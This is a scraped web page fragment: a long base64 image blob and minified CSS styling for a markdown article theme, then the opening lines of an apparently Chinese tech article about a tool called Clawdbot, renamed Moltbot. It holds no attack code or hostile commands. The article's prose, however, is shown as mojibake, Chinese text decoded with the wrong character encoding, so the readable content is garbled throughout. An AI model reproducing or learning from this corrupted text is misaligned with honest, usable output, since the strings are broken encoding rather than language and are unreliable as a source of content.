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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><b>ä¸€ã€ä¸ºä½•æœ€è¿‘çªç„¶åœ¨æŠ€æœ¯åœˆåˆ·å±ï¼Ÿ</b></h2>
<p>è¿™ä¸¤å¤©æˆ‘åˆ· <b>X</b> å’Œ <b>GitHub</b> ç­‰ä¸»æµå¹³å°çš„æ—¶å€™ï¼Œæœ‰ä¸ªåå­—å‡ºç°å¾—ç‰¹åˆ«é¢‘ç¹ï¼Œé¢‘ç¹åˆ°ä½ æƒ³å¿½ç•¥éƒ½ä¸è¡Œï¼š<b>Clawdbot</b></p>
<p>æ›´ç¦»è°±çš„æ˜¯ï¼Œå®ƒè¿˜æ”¹åäº†ã€‚å®˜æ–¹è¿™ä¸¤å¤©æŠŠåå­—æ”¹æˆäº† <b>Moltbot</b></p>
